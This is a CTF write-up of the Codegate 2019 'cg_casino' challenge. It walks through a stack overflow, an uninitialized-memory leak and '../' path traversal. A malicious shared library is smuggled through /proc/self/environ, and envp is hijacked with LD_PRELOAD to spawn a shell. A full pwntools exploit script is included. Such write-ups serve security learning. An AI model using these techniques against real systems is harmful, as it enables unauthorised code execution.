+++
title = "Codegate CTF 2019 Quals - cg_casino"
date = "2024-08-01"
description = "Codegate CTF 2019 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "bof", "/proc/self/environ", "ld_preload", "small libc", "envp"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/cg_casino'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Concept
``` bash
➜  nc 0 6677
$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$  CG CASINO $$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$
1) put voucher
2) merge voucher
3) lotto
4) up down game
5) slot machine
6) exit
> 
```

The challenge implements three casino games along with `put voucher` and `merge voucher` functionalities.


## 0x01. Vulnerability
### Stack Overflow
``` c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  char new[48]; // [rsp+30h] [rbp-60h] BYREF
  char old[40]; // [rsp+60h] [rbp-30h] BYREF
  ...
    switch ( choice )
    {
      case 1:
        memset(new, 0, 0x28uLL);
        printf("input voucher : ");
        read_401108((__int64)new);
        len32_alnum_4010A4(new);
        break;
      case 2:
        memset(old, 0, sizeof(old));
        printf("input old voucher : ");
        read_401108((__int64)old);
        xstat_unlink_400F09(new, old);
        break;
    }
  ...
}
```

When putting or merging a `voucher`, the voucher name is received through `read_401108()`:

``` c
unsigned __int64 __fastcall read_401108(__int64 a1)
{
  ...
  while ( 1 )
  {
    if ( (unsigned int)read(0, &buf, 1uLL) != 1 )
      exit(-1);
    if ( buf == 10 )
      break;
    index = i++;
    *(_BYTE *)(a1 + index) = buf;
  }
  v1 = i++;
  *(_BYTE *)(v1 + a1) = 0;
  ...
}
```

The function reads input byte by byte until encountering `\n`, which causes an overflow all the way to the end of the stack.

However, since `main()` calls `exit()` directly without returning, gaining RIP control appears difficult.

### Stack Leak
I stumbled upon this during dynamic analysis - there's a leak of uninitialized data in `lotto_4011A7()`:

``` c
unsigned __int64 lotto_4011A7()
{
  ...
  int number[6]; // [rsp+10h] [rbp-40h]
  int guess[6]; // [rsp+30h] [rbp-20h] BYREF
  ...
  while ( i <= 5 )
  {
    __isoc99_scanf("%u", &guess[i]);
    getchar();
    if ( (unsigned int)guess[i] <= 44 )
      ++i;
    else
      printf("%u : out of range\n", (unsigned int)guess[i]);
  }
  puts("===================");
  ...
}
```

The game generates 6 random numbers between 0-44, stores them, and asks you to guess them by filling the `guess` array.

Here's the issue: if you input something that doesn't match the `%u` format (like `a`), `scanf` fails and prints the existing value in `guess`:

``` bash
GUESS 6 Numbers!
===================
|  |  |  |  |  |  |
===================
a a a a a a
2522534248 : out of range
2522534248 : out of range
2522534248 : out of range
2522534248 : out of range
```

### File Copy
This is actually a feature rather than a vulnerability, but `merge voucher` calls this function:

``` c
unsigned __int64 __fastcall xstat_unlink_400F09(const char *new, char *old)
{
  ...
  if ( strlen(old) == 32 )
  {
    if ( xstat_4016D0(old, &n_4) == -1 )
    {
      puts("voucher doesn't exist");
    }
    else if ( n_4.st_size <= 4096 )
    {
      fd_old = open(old, 0);
      if ( fd_old != -1 )
      {
        len = read(fd_old, buf, 4096uLL);
        close(fd_old);
        fd_new = open(new, 66, 384LL);
        if ( fd_new != -1 )
        {
          write(fd_new, buf, len);
          close(fd_new);
          unlink(old);
        }
        memset(buf, 0, 0x1000uLL);
      }
    }
    ...
  }
}
```

By specifying a filename in stack's `new` through `put voucher`, you can move any 32-byte filename to the `/home/cg_casino/voucher/` directory.
Since there's no validation on the input, the length restriction can be bypassed by combining `../` and `./`:

- `../../../../../../././etc/passwd`


## 0x02. Exploit
### File Drop
That's all the vulnerabilities, but the problem is there's no way to upload files to the server.
I needed to somehow upload a file, use `merge voucher` to move it to `/home/cg_casino/voucher/`, then proceed to the next step...

That's when I found this in the `/proc/self/environ` file:

``` bash
cg_casino@3197b44a521a:~/voucher$ cat /proc/1203/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=3197b44a52
1aERASER2=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
```

The `AAAA` values are environment variables defined in `docker-compose.yml`, and the front part being overwritten with different content suggested the values reflect runtime changes.

When I actually overwrote the environment variables til the end of the stack, I confirmed that `/proc/self/environ` changed:

``` bash
cg_casino@3197b44a521a:~/voucher$ cat /proc/1241/environ
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
...
```

So we can manipulate stack values to leave data into a file at `/proc/self/environ`.

### Stack Overflow & File Copy
There are three conditions to write libc data to `/proc/self/environ` and bring it to `/home/cg_casino/voucher`:

- `new` in main must be the filename to save in `/home/cg_casino/voucher`
- `old` in main must be 32 bytes long and point to `/proc/self/environ`
- libc data must be written to the environment variable space at the end of the stack

So I structured the payload as follows:

``` python
    payload = b"mylib.so\x00"
    payload += b"\x00" * (env - buf - len(payload))
    payload += lib_data
    payload += b"\x00" * (3432 - (len(payload)))
    put_voucher(s, payload)

    merge_voucher(s, b"../../../../../proc/self/environ")
```

During this process, since input is received through `read_401108()`, there's a risk of data being cut off if libc contains `\x0a`.
There was indeed a `\x0a`, so I tried replacing it with `\x0b` and fortunately the libc worked fine:

``` python
    with open("./mylib.so", "rb") as f:
        lib_data = f.read()
    lib_data = lib_data.replace(b"\x0a", b"\x0b")
```

This needs to be added to the payload.

### Small Libc
Another issue here is that the environment variable area has limits, restricting the length of data that can be brought via `merge voucher`:

``` bash
root@3197b44a521a:/home/cg_casino/voucher# ls -al
total 16
drwxrwx-wx 1 root      root      4096 Aug  1 05:24 .
drwxr-xr-x 1 root      root      4096 Jul 31 08:08 ..
-rw------- 1 cg_casino cg_casino 3432 Aug  1 05:23 mylib.so
```

I needed a libc smaller than 3432 bytes, which I created by compiling this source code on `Ubuntu 16.04`:

``` c
// gcc -w -znorelro -s -fPIC -shared -nostdlib -o mylib.so mylib.c
__attribute__((destructor))
void on_unload() {
	system("/bin/sh");
}
```

Interestingly, `Ubuntu 22.04` produces a much larger file size with the same compilation options - compiler version can make such a significant difference:

``` bash
➜  ls -al | grep mylib_from
-rwxr-xr-x 1 user user    2632 Aug  1 08:28 mylib_from1604.so
-rwxr-xr-x 1 user user   10160 Aug  1 14:40 mylib_from2204.so
```

### Stack Leak
As confirmed earlier, inputting non-`%u` format data in `lotto_4011A7()` prints `guess[i]` data.
Since `guess` is an array of 6 integers, we can examine `0x18` bytes of memory. Checking the uninitialized `guess` values:

``` bash
gef➤  x/3gx $rsp+0x30
0x7fffffffdef0: 0x0000000000000000      0x00007ffff7ffe168
0x7fffffffdf00: 0x0000000000000000
```

There's a libc region address, but considering what we need, it's closer to a stack address.
I checked if executing another function first could leave a stack address at `$rsp+0x30`.
Calling `up_down_40139E()` followed by `lotto_4011A7()` works:

``` bash
gef➤  x/3gx $rsp+0x30
0x7fffffffdef0: 0x0000000000000000      0x00007fffffffdf10
0x7fffffffdf00: 0x0000000000400bb0
```

Since `guess` is integer, inputting 'a' for the 3rd and 4th inputs leaks 4 bytes each:

``` python
    updown(s, [1, 1, 1, 1, 1, 1])
    r = lotto(s, b"1 2 a 3 a 4 5 6")
    lower = int(r.split(b" : ")[0])
    upper = int(r.split(b" : ")[1].split(b"\n")[1])
    buf = upper << 32 | lower + 0x40
    log.info(f"buf : {hex(buf)}")
```

### Envp Overwrite
Now that the libc file executing the shell is in `/home/cg_casino/voucher`, we just need to execute it.
The common technique for loading a desired libc uses the `LD_PRELOAD` environment variable, so I considered how to leverage this.

Since I defined `on_unload()` in the libc, I needed to verify two things:

1. Does `exit(0);` trigger `on_unload()`?
2. Does modifying environment variables after execution apply `LD_PRELOAD`?

I wrote test code and confirmed #1 works, but unfortunately #2 doesn't.
So I need to manipulate the current process's environment variables and execute a process that uses those variables.

Then I remembered that `slot_401477()` uses `system("/usr/bin/clear");`, and during dynamic analysis this message appeared:

``` bash
        _______
       |JACKPOT|
=========================
|   ___    ___    ___    |
|  | ? |  | ? |  | ? |   |
|  |___|  |___|  |___|   |
=========================
|________________________|
press any key

TERM environment variable not set
```

The current process `cg_casino` has environment variables cleared via `ERASER` in `docker-compose.yml`.
When using `system()` here, `execve()` is called internally and `**envp` seems to be passed in this process.

`**envp` is passed as the third argument when `main()` is called, and stored at `$rbp-0x88` early in `main()`:

```
   0x400ca6:    push   rbp
   0x400ca7:    mov    rbp,rsp
   0x400caa:    sub    rsp,0x90
   0x400cb1:    mov    DWORD PTR [rbp-0x74],edi
   0x400cb4:    mov    QWORD PTR [rbp-0x80],rsi
   0x400cb8:    mov    QWORD PTR [rbp-0x88],rdx
```

Following the memory:

``` bash
gef➤  x/gx $rbp-0x88
0x7fffffffdf28: 0x00007fffffffe0a8
gef➤  x/10gx 0x00007fffffffe0a8
0x7fffffffe0a8: 0x00007fffffffe276      0x00007fffffffe2b8
0x7fffffffe0b8: 0x00007fffffffe2ce      0x00007fffffffe564
0x7fffffffe0c8: 0x00007fffffffe7fa      0x00007fffffffea90
0x7fffffffe0d8: 0x00007fffffffed26      0x00007fffffffefbc
0x7fffffffe0e8: 0x00007fffffffefc7      0x0000000000000000
gef➤  x/s 0x00007fffffffe276
0x7fffffffe276: "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

The structure is `**envp`(`0x7fffffffdf28`) -> `*envp`(`0x7fffffffe0a8`) -> `first env`(`0x7fffffffe276`)`.

So we need to follow this structure, making sure to include `null` at the end of `*envp`:

``` python
    payload = b"\x00" * (env_p_p - buf)
    payload += p64(env_p)
    payload += b"\x00" * (env_p - buf - len(payload))
    payload += p64(env)
    payload += b"\x00" * (env - buf - len(payload))
    payload += b"LD_PRELOAD=/home/cg_casino/voucher/mylib.so\x00"
    put_voucher(s, payload)

    s.sendline(b"5")
```

The problem is that the environment variables end up at the edge of the stack, and this offset isn't consistent, creating a probability issue.
Continuously checking the difference showed variations around `0xXX0`, suggesting success rate of 1/256.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
import sys, os

DEBUG = False
BINARY = "cg_casino"
CONTAINER = "d20ec1bc9a88"

bp = {
    "getchar_of_main" : 0x400CF8,
    "read_bof" : 0x401108,
    "xstat_unlink" : 0x400F09,
    "slotmachine" : 0x401477,
    "lotto" : 0x4011A7,
    "scanf_of_lotto" : 0x40129D,
}

gs = f'''
set follow-fork-mode child
!b *{bp["xstat_unlink"]}
b *{bp["getchar_of_main"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def put_voucher(s, new):
    s.sendline(b"1")
    s.recvuntil(b" : ")
    s.sendline(new)
    sleep(0.1)
    return s.recvuntil(b"> ")

def merge_voucher(s, old):
    s.sendline(b"2")
    s.recvuntil(b" : ")
    s.sendline(old)
    return s.recvuntil(b"> ")

def lotto(s, numbers):
    s.sendline(b"3")
    sleep(0.1)
    s.recv()
    s.sendline(numbers)
    return s.recvuntil(b"> ")

def updown(s, numbers):
    s.sendline(b"4")
    s.recvuntil(b". \n")
    for number in numbers:
        s.sendline(str(number).encode())
        s.recvuntil(b"it\n")
    return s.recvuntil(b"> ")

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(f"/home/user/{BINARY}")
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    
    with open("./mylib.so", "rb") as f:
        lib_data = f.read()
    lib_data = lib_data.replace(b"\x0a", b"\x0b")

    s.recvuntil(b"> ")

    updown(s, [1, 1, 1, 1, 1, 1])
    r = lotto(s, b"1 2 a 3 a 4 5 6")
    lower = int(r.split(b" : ")[0])
    upper = int(r.split(b" : ")[1].split(b"\n")[1])
    buf = upper << 32 | lower + 0x40
    log.info(f"buf : {hex(buf)}")

    env = buf + 0x1796
    env = buf + 0x326
    env_p = buf + 0x158
    env_p_p = buf + 0xe8
    log.info(f"env_p_p : {hex(env_p_p)}")
    log.info(f"env_p : {hex(env_p)}")
    log.info(f"env : {hex(env)}")

    payload = b"mylib.so\x00"
    payload += b"\x00" * (env - buf - len(payload))
    payload += lib_data
    payload += b"\x00" * (3432 - (len(payload)))
    put_voucher(s, payload)
    
    pause()

    merge_voucher(s, b"../../../../../proc/self/environ")

    payload = b"\x00" * (env_p_p - buf)
    payload += p64(env_p)
    payload += b"\x00" * (env_p - buf - len(payload))
    payload += p64(env)
    payload += b"\x00" * (env - buf - len(payload))
    payload += b"LD_PRELOAD=/home/cg_casino/voucher/mylib.so\x00"
    put_voucher(s, payload)

    s.sendline(b"5")

    s.interactive()

if __name__=='__main__':
    main()
```